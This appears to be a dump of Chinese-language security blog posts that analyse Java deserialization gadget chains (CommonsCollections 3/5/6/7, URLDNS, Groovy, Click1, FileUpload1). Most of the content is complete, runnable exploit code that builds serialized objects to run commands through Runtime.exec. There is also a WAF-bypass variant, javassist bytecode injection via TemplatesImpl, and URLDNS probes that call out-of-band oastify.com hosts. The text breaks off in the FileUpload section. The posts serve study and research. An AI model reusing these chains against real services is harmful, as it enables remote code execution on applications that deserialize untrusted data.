1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package demo1;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Test7 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, TransformerConfigurationException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); Transformer[] transformers = { new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;,null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandler.setAccessible(true); Object o = annotationInvocationHandler.newInstance(Target.class,transformedMap); serialize(o); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} 上面的poc最后是用InvokerTransformer类的transform调用的templates的newTransformer方法； 如果waf过滤了”InvokerTransformer” 还有一种方法可以通过InstantiateTransformer类的transform调用TrAXFilter的构造方法类调用templates的newTransformer方法； TrAXFilter调用了newTransformer方法，而且templates是可控的 12345678public TrAXFilter(Templates templates) throws TransformerConfigurationException{ _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism();} 123456789101112131415161718192021 TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes);//templates.newTransformer Class&lt;?&gt; trAXFilterClass = TrAXFilter.class; Constructor&lt;?&gt; constructor = trAXFilterClass.getConstructor(Templates.class); constructor.newInstance(templates); InstantiateTransformer的transform方法，可以调用任意一个类的有参构造方法，所以就可以尝试调用TrAXFilter的构造方法，并把templates传递过去 12345678910111213141516public InstantiateTransformer(Class[] paramTypes, Object[] args) { super(); iParamTypes = paramTypes; iArgs = args;}public Object transform(Object input) { try { if (input instanceof Class == false) { throw new FunctorException( &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); } Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); ...... 最后将poc中的transformers数组改成下面这样，也是可以的； 1234Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})};","link":"/2024/02/29/CommonsCollections3/"},{"title":"URLDNS+CC5-7","text":"URLDNS1234567public static void main(String[] args) throws MalformedURLException { URL url = new URL(&quot;http://xop5snlkf29k57aea92nm4uei5owcm0b.oastify.com&quot;); HashMap&lt;URL, Integer&gt; hashMap = new HashMap&lt;URL, Integer&gt;(); hashMap.put(url,1);} 如果这样执行的话，就会对url发起DNS解析， 可以调试看看： 首先调用HashMap的put方法。 123public V put(K key, V value) { return putVal(hash(key), key, value, false, true);} 会通过hash函数调用key.hashCode()计算key的hashCode; 1234static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);} key是传入的URL对象，最终调用URL对象的hashCode函数， 1234567public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;} handler是URLStreamHandler的对象；handler在构造函数时被赋值了 1transient URLStreamHandler handler 接着调用了URLStreamHandler.hashCode中的getHostAddress(u)方法导致DNS解析 poc 123456789101112131415161718192021222324252627282930313233343536package demo1;import java.io.*;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Test5 { public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException { HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;URL, Integer&gt;(); URL url = new URL(&quot;http://5msdqvjsda7s3f8m8h0vkcsmgdm4avyk.oastify.com&quot;); Class c = url.getClass(); Field hashcodefield = c.getDeclaredField(&quot;hashCode&quot;); hashcodefield.setAccessible(true); hashcodefield.set(url,2); //为了防止在put时就发起DNS请求，将hashCode的默认值-1改掉，执行不了handler.hashCode(this) hashmap.put(url, 1); hashcodefield.set(url,-1); serialize(hashmap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections6前部分和URLDNS一样，后半部分和CC1一样，中间该用了TiedMapEntry 可以看看TiedMapEntry类一部分代码 123456789101112131415161718192021public class TiedMapEntry implements Map.Entry, KeyValue, Serializable { private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) { super(); this.map = map; this.key = key; } public Object getValue() { return map.get(key); } public int hashCode() { Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); } hashCode调用了getValue();其中getValue调用了get方法，并且map是可控的， Gadget chain: 12345678910111213141516 ObjectInputStream.readObject()HashMap.readObject() HashMap.hash() TiedMapEntry.hashCode() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() 从CC1的基础上就加了两行代码 12345678910111213Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;deadbeef&quot;);hashMap.put(tiedMapEntry,&quot;deadbeef&quot;); 和URLDNS一样的特点(又有差异)，在反序列化时就会执行命令，但是URLDNS链在序列化执行命令后，如果不做修改；反序列化就不会执行了 但是CC6不一样，他是序列化和反序列化都会执行命令；所以感觉就是不做修改也无伤大雅 如果要使得序列化时不调用的话，和URLDNS类似的修改就可以了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test5 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer); //其实修改LazyMap也可以；但是修改TiedMapEntry简单点， TiedMapEntry tiedMapEntry = new TiedMapEntry(hashMap, &quot;deadbeef&quot;); hashMap.put(tiedMapEntry,&quot;deadbeef&quot;); Class tiedMapEntryClass = TiedMapEntry.class; Field map = tiedMapEntryClass.getDeclaredField(&quot;map&quot;); map.setAccessible(true); map.set(tiedMapEntry,lazyMap); serialize(hashMap); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections5和CC6差不多，只是入口链不一样 CC6是利用TiedMapEntry中的hashCode函数；CC5是利用TiedMapEntry中的toString函数;为什么还可以利用toString方法；其实也就是因为toString也调用了调用了getValue方法的原因 1234567public String toString() { return getKey() + &quot;=&quot; + getValue();}public Object getValue() { return map.get(key);} BadAttributeValueExpException这个类的readObject调用valObj.toString(),valObj的值是可控的；尽管BadAttributeValueExpException没有实现 Serializable 接口的情况下,任然可以序列化 GPT:BadAttributeValueExpException类可能使用了一种特殊的序列化方式，使其能够在没有实现 Serializable 接口的情况下被序列化。一些标准的异常类，如 RuntimeException 的子类，有时会被设计成可序列化的，即使它们没有显式地实现 Serializable 接口。 123456789101112131415161718192021private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(&quot;val&quot;, null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName(); }} Gadget chain: 123456789101112131415ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test9 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;deadbeef&quot;); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); Class bclass = badAttributeValueExpException.getClass(); Field val = bclass.getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(badAttributeValueExpException,tiedMapEntry); serialize(badAttributeValueExpException); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} CommonsCollections7123456789101112131415 ObjectInputStream.readObject()HashMap.readObject() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() CC7这条链前半部分有点绕； 先利用HashMap中putVal方法，通过哈希碰撞(其实就是两个节点放在了数组中的同一个位置，HashMap本来就是数组+列表的形式)； 然后会调用key.equals(k);要添加的key对象的equals方法，k是数组中已存在的对象； 1234567891011final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i; if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); else { Node&lt;K,V&gt; e; K k; if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) // &lt;-- CC7是将key的值为一个Lazymap对象，所以会调用Lazymap.equals，但是Lazymap没有equals方法，所以找到了lazymap的父类AbstractMapDecorator; 123456public boolean equals(Object object) { if (object == this) { return true; } return map.equals(object); // &lt;--} map的值为当前调用put方法的HashMap,然后就会调用HashMap的equals方法;但是HashMap没有equals方法，所以找到了HashMap的父类AbstractMap;(一开始没搞太懂map是什么时候被赋值为当前调用put方法的HashMap的，调试后发现是通过LazyMap的构造函数super(map);) 注意：在AbstractMap.equals方法中，将对象o(也就是Hashmap数组中已经存在的Hashmap对象，并不是当前调用put方法的Hashmap对象)赋值给了m;然后调用m.get(key),如果对象o是一个恶意的Lazymap对象，就会调用Lazymap.get 12345678910111213141516171819202122public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o; if (m.size() != size()) return false; try { Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) { Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key)))// &lt;-- 对于我们的 exp 来说, 会在这里会触发 ...... poc 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package demo1;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Test10 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // &quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode() == 3872 HashMap&lt;String, String&gt; hashMap1 = new HashMap&lt;&gt;(); HashMap&lt;String, String&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap1.put(&quot;yy&quot;,&quot;1&quot;); hashMap2.put(&quot;zZ&quot;,&quot;1&quot;); Map lazyMap1 = LazyMap.decorate(hashMap1, new ConstantTransformer(1)); Map lazyMap2 = LazyMap.decorate(hashMap2,new ConstantTransformer(1));// System.out.println(lazyMap1.hashCode());// System.out.println(lazyMap2.hashCode()); HashMap&lt;Object, Object&gt; hashMap3 = new HashMap&lt;&gt;(); hashMap3.put(lazyMap1,&quot;deadbeef&quot;); hashMap3.put(lazyMap2,&quot;deadbeef&quot;); // LazyMap.get方法中会将结果存入 hashMap1 中, 所以这里需要将其清除, 否则 hashcode 就不一样了 hashMap1.remove(&quot;zZ&quot;); //防止在序列化时就执行命令 Class lclass = lazyMap1.getClass(); Field factory = lclass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(lazyMap1,chainedTransformer); serialize(hashMap3); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }}","link":"/2024/02/29/URLDNS+CC5-7/"},{"title":"Groovy+Click1+FileUpload1","text":"Groovy依赖 123456 &lt;!-- Groovy : 1.7.0-2.4.3 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt; &lt;artifactId&gt;groovy&lt;/artifactId&gt; &lt;version&gt;2.4.3&lt;/version&gt; &lt;/dependency&gt; MethodClosure中有一个 doCall 方法，调用 InvokerHelper.invokeMethod() 方法进行方法调用。 123456789101112131415161718192021222324252627public MethodClosure(Object owner, String method) { super(owner); this.method = method; final Class clazz = owner.getClass()==Class.class?(Class) owner:owner.getClass(); maximumNumberOfParameters = 0; parameterTypes = EMPTY_CLASS_ARRAY; List&lt;MetaMethod&gt; methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method); for(MetaMethod m : methods) { if (m.getParameterTypes().length &gt; maximumNumberOfParameters) { Class[] pt = m.getNativeParameterTypes(); maximumNumberOfParameters = pt.length; parameterTypes = pt; } }}public String getMethod() { return method;}protected Object doCall(Object arguments) { return InvokerHelper.invokeMethod(getOwner(), method, arguments);} 那么这样就可以执行命令; 1234MethodClosure mc = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);Method m = MethodClosure.class.getDeclaredMethod(&quot;doCall&quot;, Object.class);m.setAccessible(true);m.invoke(mc, &quot;calc&quot;); ProcessGroovyMethods.execute()方法 123public static Process execute(final String self) throws IOException { return Runtime.getRuntime().exec(self);} String.execute() 方法 Groovy 为 String 类型添加了 execute() 方法，以便执行 shell 命令，这个方法会返回一个 Process 对象。也就是说，在 Groovy 中，可以直接使用 &quot;ls&quot;.execute() 这种方法来执行系统命令 “ls”。 在 Java 中，就可以直接写做：就是时调用”calc”字符串的execute函数；最终执行calc命令 12MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);methodClosure.call(); doCall方法由protected修饰，所以调用call方法;MethodClosure是没有call方法的，最终调用其父类Closure.call()； 但是看代码得知，最终还是调回到MethodClosure.doCall(args) 12345678910public V call(Object... args) { try { return (V) getMetaClass().invokeMethod(this,&quot;doCall&quot;,args); } catch (InvokerInvocationException e) { ExceptionUtils.sneakyThrow(e.getCause()); return null; // unreachable statement } catch (Exception e) { return (V) throwRuntimeException(e); }} ConvertedClosure的父类是ConversionHandler； ConversionHandler这个类实现了InvocationHandler接口；思路是这样的，为ConvertedClosure类搞一个代理；当调用方法时就会执行到ConversionHandler.invoke();ConversionHandler.invoke()调用了invokeCustom方法 123456789101112131415public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { VMPlugin plugin = VMPluginFactory.getPlugin(); if (plugin.getVersion()&gt;=7 &amp;&amp; isDefaultMethod(method)) { Object handle = handleCache.get(method); if (handle == null) { handle = plugin.getInvokeSpecialHandle(method, proxy); handleCache.put(method, handle); } return plugin.invokeHandle(handle, args); } if (!checkMethod(method)) { try { return invokeCustom(proxy, method, args); // &lt;&lt;== ...... ConvertedClosure.invokeCustom方法中，如果要代理的函数名和String method相同，就会调用call; 而((Closure) getDelegate())其实就是得到ConvertedClosure构造函数的第一个参数，很明显；这些值都是可控的，那么我们就可以去调用一个MethodClosure的call函数，从而导致命令执行； 12345678910 public ConvertedClosure(Closure closure, String method) { super(closure); this.methodName = method; }public Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable { if (methodName!=null &amp;&amp; !methodName.equals(method.getName())) return null; return ((Closure) getDelegate()).call(args); } Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package groovy;import org.codehaus.groovy.runtime.ConversionHandler;import org.codehaus.groovy.runtime.ConvertedClosure;import org.codehaus.groovy.runtime.MethodClosure;import org.codehaus.groovy.runtime.ProcessGroovyMethods;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.Comparator;import java.util.Map;import java.util.PriorityQueue;public class Test1 { public static void main(String[] args) throws Exception { MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;); //第二个参数为&quot;entrySet&quot;是为了使invokeCustom的if为true ConvertedClosure closure = new ConvertedClosure(methodClosure, &quot;entrySet&quot;); Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, closure); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler); serialize(invocationHandler); unserialize(); //入口链用&quot;PriorityQueue&quot;也是可以的，如果要用记,得改第二个参数为&quot;compares&quot;,否则invokeCustom的if过不去// Comparator&lt;Object&gt; comparator = (Comparator&lt;Object&gt;) Proxy.newProxyInstance(// Comparator.class.getClassLoader(), new Class&lt;?&gt;[]{Comparator.class}, closure);//// PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(comparator); //只能通过反射将size的值改为2;要使得参数为空;不能像之前一样add两个数据，否则最终会执行&quot;calc&quot;.execute(数据1,数据2)==&gt;报错，// Field size = queue.getClass().getDeclaredField(&quot;size&quot;);// size.setAccessible(true);// size.set(queue,2);// serialize(queue);// unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} gadget: 123456AnnotationInvocationHandler.readObject() Map.entrySet() (Proxy) ConversionHandler.invoke() ConvertedClosure.invokeCustom() MethodClosure.call() ProcessGroovyMethods.execute() 或者(就是入口链不一样) 123456PriorityQueue.readObject() comparator.compare() (Proxy) ConversionHandler.invoke() ConvertedClosure.invokeCustom() MethodClosure.call() ProcessGroovyMethods.execute() Click1依赖 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.apache.click&lt;/groupId&gt; &lt;artifactId&gt;click-nodeps&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt;&lt;/dependency&gt; Column类的内部类:ColumnComparator类调用了compare方法 this.column是可控的；使他调用到Column.getProperty(); 然后会调用到PropertyUtils.getValue; getObjectPropertyValue方法：”source”形参和”name”形参都是可控的；如果使得”source”形参为恶意的TemplatesImpl对象，”name”为outputProperties；最后method.invoke(source);就会调用TemplatesImpl.getoutputProperties；这就和CB链很像； 123456789101112private static Object getObjectPropertyValue(Object source, String name, Map cache) { CacheKey methodNameKey = new CacheKey(source, name); Method method = null; try { method = (Method)cache.get(methodNameKey); if (method == null) { method = source.getClass().getMethod(ClickUtils.toGetterName(name)); //&lt;&lt;=== cache.put(methodNameKey, method); } return method.invoke(source); //&lt;&lt;=== 1234567public static String toGetterName(String property) { HtmlStringBuffer buffer = new HtmlStringBuffer(property.length() + 3); buffer.append(&quot;get&quot;); buffer.append(Character.toUpperCase(property.charAt(0))); buffer.append(property.substring(1)); return buffer.toString();} gadget 123456PriorityQueue.readObject() Column$ColumnComparator.compare() Column.getProperty() PropertyUtils.getValue() PropertyUtils.getObjectPropertyValue() TemplatesImpl.getOutputProperties() Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package click;import java.io.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import org.apache.click.control.Column;import org.apache.click.control.Table;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Comparator;import java.util.PriorityQueue;public class Test1 { public static void main(String[] args) throws Exception { String cmd = &quot;calc&quot;; //TemplateImpl 动态加载字节码 String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;; ClassPool classPool=ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload=classPool.makeClass(&quot;a&quot;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); byte[] code=payload.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field name = templatesClass.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;zIxyd&quot;); byte[][] bytes= {code}; Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,bytes); Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); Column column = new Column(&quot;outputProperties&quot;); //防止空指针异常 column.setTable(new Table()); Class clazz = Class.forName(&quot;org.apache.click.control.Column$ColumnComparator&quot;); Constructor declaredConstructor = clazz.getDeclaredConstructor(Column.class); declaredConstructor.setAccessible(true); Comparator comparator = (Comparator)declaredConstructor.newInstance(column); //先填垃圾数据，防止反序列化时就调用，后面在通过反射改回来 PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1); priorityQueue.add(1); priorityQueue.add(2); //通过反射将垃圾数据改成恶意数据 Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;); field.setAccessible(true); Object[] objects = (Object[]) field.get(priorityQueue); objects[0] = templates; Field comparatorField = priorityQueue.getClass().getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue,comparator); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} FileUpload1依赖 123456789101112 &lt;!-- commons-fileupload : 1.3.x --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-fileupload&lt;/groupId&gt; &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt; &lt;version&gt;1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.4&lt;/version&gt; &lt;/dependency&gt; FileUpload 组件是 Apache 提供的上传组件，它本身依赖于 commons-io 组件，ysoserial 中利用了这个组件来任意写、读文件或者目录。但是具体是对文件还是目录操作与 FileUpload 以及 JDK 的版本有关。 受空字节截断影响的JDK版本范围:JDK&lt;1.7.40;FileUpload 在 1.3.1 版本中，官方对空字节截断进行了修复，在 readObject 中，判断成员变量 repository 是否为空，不为空的情况下判断是不是目录，并判断目录路径中是否包含 \\0 空字符。 org.apache.commons.fileupload.disk.DiskFileItem类的readObject； 